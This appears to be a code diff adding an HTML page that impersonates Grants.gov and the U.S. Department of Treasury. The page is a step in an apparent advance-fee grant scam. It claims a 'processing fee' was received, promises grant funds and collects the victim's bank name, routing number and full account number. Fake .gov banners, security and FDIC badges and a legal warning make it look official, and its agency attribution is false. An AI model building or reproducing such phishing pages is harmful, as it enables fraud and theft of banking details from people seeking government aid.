@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Setup | Grants.gov Official</title>
+    
+    <!-- Official USWDS Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700;900&family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        /* ===== OFFICIAL U.S. GOVERNMENT STYLING ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f0f0;
+            color: #1b1b1b;
+            line-height: 1.5;
+        }
+
+        /* === USA Flag Banner === */
+        .usa-banner {
+            background-color: #f0f0f0;
+            font-size: 14px;
+            padding: 8px 0;
+            border-bottom: 1px solid #d9d9d9;
+        }
+
+        .banner-content {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .usa-flag {
+            width: 20px;
+            height: 20px;
+            background: linear-gradient(180deg, #b22234 0%, #b22234 50%, #ffffff 50%, #ffffff 100%);
+            border: 1px solid #0a0a0a;
+        }
+
+        .banner-text strong {
+            font-weight: 700;
+        }
+
+        .dot-gov {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .dot-gov span {
+            background: #1b1b1b;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        /* === Header === */
+        .usa-header {
+            background: #112f4e;
+            color: white;
+            border-bottom: 4px solid #b22234;
+        }
+
+        .header-content {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .official-seal {
+            width: 50px;
+            height: 50px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #112f4e;
+            font-size: 24px;
+            border: 2px solid #b22234;
+        }
+
+        .agency-name h1 {
+            font-family: 'Merriweather', serif;
+            font-size: 22px;
+            font-weight: 700;
+            color: white;
+        }
+
+        .agency-name .gov-domain {
+            font-size: 12px;
+            color: #ffd700;
+            display: block;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: white;
+        }
+
+        .user-info i {
+            color: #ffd700;
+        }
+
+        .logout-btn {
+            background: transparent;
+            border: 1px solid white;
+            color: white;
+            padding: 5px 15px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .logout-btn:hover {
+            background: rgba(255,255,255,0.1);
+        }
+
+        /* === Progress Bar === */
+        .progress-section {
+            background: white;
+            border-bottom: 1px solid #d9d9d9;
+        }
+
+        .progress-container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 25px 20px;
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .progress-steps::before {
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #e5e5e5;
+            z-index: 1;
+        }
+
+        .step {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            flex: 1;
+        }
+
+        .step-circle {
+            width: 40px;
+            height: 40px;
+            background: white;
+            border: 2px solid #e5e5e5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+            font-weight: 700;
+            color: #5c5c5c;
+        }
+
+        .step.completed .step-circle {
+            background: #b22234;
+            border-color: #b22234;
+            color: white;
+        }
+
+        .step.active .step-circle {
+            background: #112f4e;
+            border-color: #112f4e;
+            color: white;
+        }
+
+        .step-label {
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        /* === Main Container === */
+        .main-container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+
+        /* === Account Card === */
+        .account-card {
+            background: white;
+            border: 1px solid #d9d9d9;
+            padding: 40px;
+        }
+
+        .section-title {
+            font-family: 'Merriweather', serif;
+            font-size: 20px;
+            color: #112f4e;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #b22234;
+        }
+
+        /* === Payment Confirmation === */
+        .payment-confirmation {
+            background: #f0fdf4;
+            padding: 20px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-left: 4px solid #10b981;
+        }
+
+        .payment-confirmation i {
+            font-size: 30px;
+            color: #10b981;
+        }
+
+        .payment-confirmation h3 {
+            color: #10b981;
+            margin-bottom: 5px;
+        }
+
+        .payment-confirmation p {
+            color: #1b1b1b;
+        }
+
+        /* === Bank Card Preview === */
+        .bank-card-preview {
+            background: linear-gradient(145deg, #112f4e, #1e4a7a);
+            color: white;
+            padding: 30px;
+            border-radius: 16px;
+            margin-bottom: 30px;
+            position: relative;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+        }
+
+        .card-chip {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+        }
+
+        .card-chip i {
+            font-size: 40px;
+            color: #ffd700;
+        }
+
+        .card-number-preview {
+            font-size: 24px;
+            letter-spacing: 4px;
+            margin-bottom: 20px;
+            font-family: monospace;
+        }
+
+        .card-details-preview {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .preview-label {
+            font-size: 12px;
+            opacity: 0.7;
+        }
+
+        .preview-value {
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        /* === Form === */
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #1b1b1b;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #d9d9d9;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: #112f4e;
+            outline: none;
+        }
+
+        .form-group input.error {
+            border-color: #b22234;
+            background: #fff5f5;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .input-hint {
+            font-size: 13px;
+            color: #5c5c5c;
+            margin-top: 5px;
+        }
+
+        /* === Account Type Selection === */
+        .account-types {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .account-type {
+            border: 2px solid #e5e5e5;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .account-type:hover {
+            border-color: #112f4e;
+        }
+
+        .account-type.selected {
+            border-color: #112f4e;
+            background: #f0f7ff;
+        }
+
+        .account-type i {
+            font-size: 30px;
+            color: #112f4e;
+            margin-bottom: 10px;
+        }
+
+        .account-type h4 {
+            margin-bottom: 5px;
+        }
+
+        .account-type p {
+            font-size: 13px;
+            color: #5c5c5c;
+        }
+
+        /* === Authorization Box === */
+        .authorization-box {
+            background: #f8f8f8;
+            padding: 20px;
+            margin: 30px 0;
+            border-left: 4px solid #112f4e;
+        }
+
+        .authorization-box label {
+            display: flex;
+            align-items: start;
+            gap: 10px;
+            font-size: 14px;
+        }
+
+        .authorization-box input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin-top: 2px;
+        }
+
+        /* === Buttons === */
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: #b22234;
+            color: white;
+            border: none;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-primary:hover {
+            background: #8b1a1a;
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            color: #112f4e;
+            border: 2px solid #112f4e;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+
+        .btn-secondary:hover {
+            background: #112f4e;
+            color: white;
+        }
+
+        /* === Messages === */
+        .message {
+            padding: 15px;
+            margin-bottom: 25px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+        }
+
+        .message.error {
+            background: #fef2f2;
+            border-left: 4px solid #b22234;
+            color: #b22234;
+        }
+
+        .message.success {
+            background: #f0fdf4;
+            border-left: 4px solid #10b981;
+            color: #10b981;
+        }
+
+        /* === Security Badges === */
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 30px 0;
+        }
+
+        .security-badges span {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #5c5c5c;
+        }
+
+        .security-badges i {
+            color: #112f4e;
+        }
+
+        /* === No Payment Message === */
+        .no-payment-card {
+            background: white;
+            border: 1px solid #d9d9d9;
+            padding: 60px 40px;
+            text-align: center;
+        }
+
+        .no-payment-card i {
+            font-size: 60px;
+            color: #b22234;
+            margin-bottom: 20px;
+        }
+
+        .no-payment-card h2 {
+            font-family: 'Merriweather', serif;
+            font-size: 24px;
+            color: #112f4e;
+            margin-bottom: 15px;
+        }
+
+        /* === Footer === */
+        .usa-footer {
+            background: #112f4e;
+            color: white;
+            margin-top: 60px;
+            border-top: 4px solid #b22234;
+        }
+
+        .footer-content {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 30px 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            color: rgba(255,255,255,0.8);
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            color: #ffd700;
+        }
+
+        /* === Responsive === */
+        @media (max-width: 768px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            .account-types {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- USA BANNER -->
+    <div class="usa-banner">
+        <div class="banner-content">
+            <div class="usa-flag"></div>
+            <div class="banner-text">
+                <strong>An official website of the United States government</strong>
+            </div>
+            <div class="dot-gov">
+                <i class="fas fa-lock"></i> .gov
+                <span>Official</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- HEADER -->
+    <header class="usa-header">
+        <div class="header-content">
+            <div class="logo-area">
+                <div class="official-seal">
+                    <i class="fas fa-eagle"></i>
+                </div>
+                <div class="agency-name">
+                    <h1>Grants.gov</h1>
+                    <span class="gov-domain">U.S. Department of Treasury</span>
+                </div>
+            </div>
+            <div class="user-info" id="userInfo">
+                <i class="fas fa-user-circle"></i>
+                <span id="userName">Loading...</span>
+                <button class="logout-btn" onclick="logout()">Sign Out</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- PROGRESS BAR -->
+    <div class="progress-section">
+        <div class="progress-container">
+            <div class="progress-steps">
+                <div class="step completed">
+                    <div class="step-circle">✓</div>
+                    <div class="step-label">Application</div>
+                </div>
+                <div class="step completed">
+                    <div class="step-circle">✓</div>
+                    <div class="step-label">Payment</div>
+                </div>
+                <div class="step active">
+                    <div class="step-circle">3</div>
+                    <div class="step-label">Account</div>
+                </div>
+                <div class="step">
+                    <div class="step-circle">4</div>
+                    <div class="step-label">Confirmation</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <main class="main-container" id="mainContent">
+        <!-- This will be populated by JavaScript -->
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="usa-footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Accessibility</a>
+                <a href="#">FOIA</a>
+                <a href="#">Contact Us</a>
+            </div>
+            <div>
+                <i class="fas fa-flag-usa" style="color: #b22234; margin-right: 8px;"></i>
+                U.S. Department of Treasury · An official website of the United States government
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // ===== CHECK LOGIN AND PAYMENT STATUS =====
+        document.addEventListener('DOMContentLoaded', function() {
+            const isLoggedIn = localStorage.getItem('grantsLoggedIn') === 'true';
+            const userName = localStorage.getItem('grantsName');
+            
+            if (!isLoggedIn) {
+                window.location.href = 'auth.html';
+                return;
+            }
+            
+            document.getElementById('userName').textContent = userName || 'Applicant';
+            
+            // Check if payment is complete
+            const paymentComplete = localStorage.getItem('paymentComplete') === 'true';
+            
+            if (!paymentComplete) {
+                showNoPayment();
+                return;
+            }
+            
+            // Load application data
+            const appData = JSON.parse(localStorage.getItem('applicationData') || '{}');
+            showAccountForm(appData);
+        });
+
+        // ===== LOGOUT FUNCTION =====
+        function logout() {
+            localStorage.removeItem('grantsLoggedIn');
+            localStorage.removeItem('grantsName');
+            localStorage.removeItem('grantsEmail');
+            window.location.href = 'auth.html';
+        }
+
+        // ===== SHOW NO PAYMENT =====
+        function showNoPayment() {
+            const mainContent = document.getElementById('mainContent');
+            mainContent.innerHTML = `
+                <div class="no-payment-card">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <h2>Payment Required</h2>
+                    <p style="color: #5c5c5c; margin-bottom: 30px;">Please complete the payment first before setting up your account.</p>
+                    <button class="btn-primary" onclick="window.location.href='payment.html'" style="width: auto; padding: 12px 40px;">
+                        Go to Payment <i class="fas fa-arrow-right" style="margin-left: 10px;"></i>
+                    </button>
+                </div>
+            `;
+        }
+
+        // ===== SHOW ACCOUNT FORM =====
+        function showAccountForm(appData) {
+            const grantAmount = parseInt(appData.grantAmount || '0').toLocaleString();
+            const processingFee = parseInt(appData.processingFee || '0').toLocaleString();
+            
+            const mainContent = document.getElementById('mainContent');
+            mainContent.innerHTML = `
+                <div class="account-card">
+                    <!-- PAYMENT CONFIRMATION -->
+                    <div class="payment-confirmation">
+                        <i class="fas fa-check-circle"></i>
+                        <div>
+                            <h3>Payment Received ✓</h3>
+                            <p>Your processing fee of $${processingFee} has been successfully processed.</p>
+                        </div>
+                    </div>
+
+                    <h2 class="section-title">Bank Account Information</h2>
+                    <p style="margin-bottom: 25px;">Please provide your bank account details to receive your grant funds of <strong>$${grantAmount}</strong>.</p>
+                    
+                    <div id="errorMessage" class="message error">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span id="errorText"></span>
+                    </div>
+                    
+                    <!-- BANK CARD PREVIEW -->
+                    <div class="bank-card-preview">
+                        <div class="card-chip">
+                            <i class="fas fa-microchip"></i>
+                            <i class="fas fa-cc-visa" style="font-size: 40px;"></i>
+                        </div>
+                        <div class="card-number-preview" id="cardPreview">•••• •••• •••• ••••</div>
+                        <div class="card-details-preview">
+                            <div>
+                                <div class="preview-label">Account Holder</div>
+                                <div class="preview-value" id="namePreview">________________</div>
+                            </div>
+                            <div>
+                                <div class="preview-label">Routing</div>
+                                <div class="preview-value" id="routingPreview">•••••••</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- ACCOUNT TYPE SELECTION -->
+                    <div class="account-types">
+                        <div class="account-type selected" id="typeChecking" onclick="selectAccountType('checking')">
+                            <i class="fas fa-money-check-alt"></i>
+                            <h4>Checking Account</h4>
+                            <p>For everyday transactions</p>
+                        </div>
+                        <div class="account-type" id="typeSavings" onclick="selectAccountType('savings')">
+                            <i class="fas fa-piggy-bank"></i>
+                            <h4>Savings Account</h4>
+                            <p>For saving funds</p>
+                        </div>
+                    </div>
+                    
+                    <form id="accountForm">
+                        <div class="form-group">
+                            <label>Account Holder Name</label>
+                            <input type="text" id="accountName" value="${appData.fullName || ''}" oninput="updatePreview()" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Bank Name</label>
+                            <input type="text" id="bankName" placeholder="e.g., Chase, Bank of America, Wells Fargo" required>
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Routing Number</label>
+                                <input type="text" id="routingNumber" placeholder="123456789" maxlength="9" oninput="validateRouting(this)" required>
+                                <div class="input-hint">9-digit number found on your check</div>
+                            </div>
+                            <div class="form-group">
+                                <label>Account Number</label>
+                                <input type="text" id="accountNumber" placeholder="Enter account number" required>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Confirm Account Number</label>
+                            <input type="text" id="confirmAccount" placeholder="Re-enter account number" required>
+                        </div>
+                        
+                        <div class="authorization-box">
+                            <label>
+                                <input type="checkbox" id="authorize" required>
+                                <span>I authorize the U.S. Department of Treasury to deposit <strong>$${grantAmount}</strong> into the bank account provided above. I certify that I am the owner of this account and all information is accurate. I understand that providing false information may result in legal penalties under 18 U.S.C. § 1001.</span>
+                            </label>
+                        </div>
+                        
+                        <button type="submit" class="btn-primary" id="submitBtn">
+                            Submit & Receive Funds: $${grantAmount}
+                        </button>
+                    </form>
+                    
+                    <button class="btn-secondary" onclick="window.location.href='payment.html'">
+                        ← Back to Payment
+                    </button>
+                    
+                    <div class="security-badges">
+                        <span><i class="fas fa-lock"></i> Bank-level Security</span>
+                        <span><i class="fas fa-shield-alt"></i> FDIC Insured</span>
+                        <span><i class="fas fa-check-circle"></i> Encrypted</span>
+                    </div>
+                </div>
+            `;
+
+            // Set up preview updates
+            setupPreviewUpdates();
+        }
+
+        // ===== SETUP PREVIEW UPDATES =====
+        function setupPreviewUpdates() {
+            const accountName = document.getElementById('accountName');
+            const routingNumber = document.getElementById('routingNumber');
+            
+            if (accountName) {
+                accountName.addEventListener('input', updatePreview);
+            }
+            
+            if (routingNumber) {
+                routingNumber.addEventListener('input', function() {
+                    validateRouting(this);
+                    updatePreview();
+                });
+            }
+        }
+
+        // ===== UPDATE CARD PREVIEW =====
+        function updatePreview() {
+            const name = document.getElementById('accountName')?.value;
+            const routing = document.getElementById('routingNumber')?.value;
+            
+            if (name) {
+                document.getElementById('namePreview').textContent = name;
+            }
+            
+            if (routing && routing.length >= 4) {
+                document.getElementById('routingPreview').textContent = '••••' + routing.slice(-4);
+            }
+        }
+
+        // ===== VALIDATE ROUTING NUMBER =====
+        function validateRouting(input) {
+            input.value = input.value.replace(/\D/g, '').substring(0, 9);
+        }
+
+        // ===== SELECT ACCOUNT TYPE =====
+        window.selectAccountType = function(type) {
+            document.querySelectorAll('.account-type').forEach(el => {
+                el.classList.remove('selected');
+            });
+            
+            if (type === 'checking') {
+                document.getElementById('typeChecking').classList.add('selected');
+            } else {
+                document.getElementById('typeSavings').classList.add('selected');
+            }
+        };
+
+        // ===== SHOW MESSAGE =====
+        function showMessage(message, type) {
+            const errorMsg = document.getElementById('errorMessage');
+            const errorText = document.getElementById('errorText');
+            
+            if (errorMsg && errorText) {
+                errorText.textContent = message;
+                errorMsg.style.display = 'flex';
+                errorMsg.className = `message ${type}`;
+                
+                setTimeout(() => {
+                    errorMsg.style.display = 'none';
+                }, 4000);
+            }
+        }
+
+        // ===== SUBMIT ACCOUNT DETAILS =====
+        document.addEventListener('submit', function(e) {
+            if (e.target.id === 'accountForm') {
+                e.preventDefault();
+                
+                const accountName = document.getElementById('accountName').value;
+                const bankName = document.getElementById('bankName').value;
+                const routingNumber = document.getElementById('routingNumber').value;
+                const accountNumber = document.getElementById('accountNumber').value;
+                const confirmAccount = document.getElementById('confirmAccount').value;
+                const authorize = document.getElementById('authorize').checked;
+                
+                // Validation
+                if (!accountName || !bankName || !routingNumber || !accountNumber || !confirmAccount) {
+                    showMessage('Please fill in all fields', 'error');
+                    return;
+                }
+                
+                if (routingNumber.length !== 9) {
+                    showMessage('Please enter a valid 9-digit routing number', 'error');
+                    return;
+                }
+                
+                if (accountNumber !== confirmAccount) {
+                    showMessage('Account numbers do not match', 'error');
+                    return;
+                }
+                
+                if (!authorize) {
+                    showMessage('You must authorize the deposit', 'error');
+                    return;
+                }
+                
+                // Save account details
+                const accountDetails = {
+                    accountName,
+                    bankName,
+                    routingNumber,
+                    accountNumber: accountNumber.slice(-4), // Only store last 4 for security
+                    accountType: document.querySelector('.account-type.selected h4')?.textContent || 'Checking Account',
+                    fullAccountNumber: accountNumber // In real app, encrypt this
+                };
+                
+                localStorage.setItem('accountDetails', JSON.stringify(accountDetails));
+                localStorage.setItem('applicationStep', '4');
+                
+                // Show loading
+                const btn = document.getElementById('submitBtn');
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                btn.disabled = true;
+                
+                // Redirect to confirmation
+                setTimeout(() => {
+                    window.location.href = 'confirmation.html';
+                }, 1500);
+            }
+        });
+    </script>
+</body>
+</html>
